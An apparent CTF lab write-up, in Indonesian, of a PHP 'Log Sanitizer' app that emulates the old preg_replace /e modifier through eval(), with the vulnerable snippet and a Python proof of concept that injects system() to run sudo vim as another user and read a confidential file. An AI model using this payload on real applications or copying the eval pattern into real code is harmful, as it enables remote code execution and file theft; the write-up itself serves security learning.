---
title: Rahasia Suryo
description: Writeup lab Rahasia Suryo
tags:
  - input injection
  - code injection
  - regex
  - CTF
draft: false
---

## Summary
* Vuln Name: `preg_replace` with `/e` modifier (Code Injection)
* Type: Input Injection
* Impact: Remote Code Execution (RCE)
* Severity: Critical
* functionality: [[input-validation]], [[regular-expression]]

## Metodologi dan Observasi
1. Pada aplikasi `Log Sanitizer` ini, pengguna difasilitasi dengan alat berbasis web pembidik dan pencari teks menggunakan [[regular-expression]] (Regex).
2. Dari berkas sumber kode di `index.php`, kita dapat melihat program PHP menstimulasikan fitur *Regular Expression* lama (yang didepresiasi pada PHP 5.5 dan dihapus pada PHP 7.0), yaitu *modifier* atau modifikator `/e`.
   ```php
   if (preg_match('/(.)([a-z]*e[a-z]*)$/', $pattern, $matches)) {
        // ...
        $result = preg_replace_callback($clean_pattern, function($m) use ($replacement) {
            return eval("return " . $replacement . ";");
        }, $text);
   }
   ```
3. Modifikator `/e` (Evaluasi) adalah fitur yang menyebabkan mesin eksekusi mengevaluasi parameter pengganti (*replacement string*) sebagai kode PHP—bukan sekadar penempatan teks biasa—sebelum menukar kumpulan yang cocok (*matches*).
4. Ketika parameter input `pattern` yang diotorisasi berakhiran eksak dengan ekstensi `e` (seperti `/pwn/e`), aplikasi terpicu mengeksekusi parameter `replacement` secara harafiah di dalam blok `eval()`.
5. Eksploitasi yang dikalkulasikan melalui kealpaan validasi penginputan nilai (*Input Injection*) bermuara sebagai cacat bawaan bahasa yang memantik aksi [[code-injection]].

## PoC
Skrip di bawah mengirimkan _request_ HTTP metode *POST* terkonstruksi yang mencegat celah *regex eval* sembari mengalihkan previlese peranti ke `suryo`.

```python
import requests

url = "http://localhost:1339/"

# Argumen sudo eksekusi editor VIM dalam mode senyap non-interaktif
# perintah mengeksekusi aksi print baris
cmd = r"sudo -u suryo /usr/bin/vim -es /home/suryo/confidential.txt -c ':print' -c ':q!' 2>&1"

# Mengelabui fungsi $replacement agar sistem mematuhi string dalam balutan fungsi system()   
data = {
    'pattern': '/pwn/e',
    'replacement': f'system("{cmd}")',
    'text': 'pwn'
}

res = requests.post(url, data=data)

if "pwn{" in res.text:
    for line in res.text.split('\n'):
        if "pwn{" in line:
            print(f"[+] Flag found: {line.strip()}")
```

## Impact
Karena ini adalah eksekusi berbasis [[remote-code-execution]], serangan sanggup mereplikasi kemampuan administrasi server target dan melangkaui pelindung otorisasi berkas lokal. Pengembang wajib menyingkirkan konstruksi logika `eval` statis pengganti [[input-validation]] modern seperti `preg_replace_callback()`.
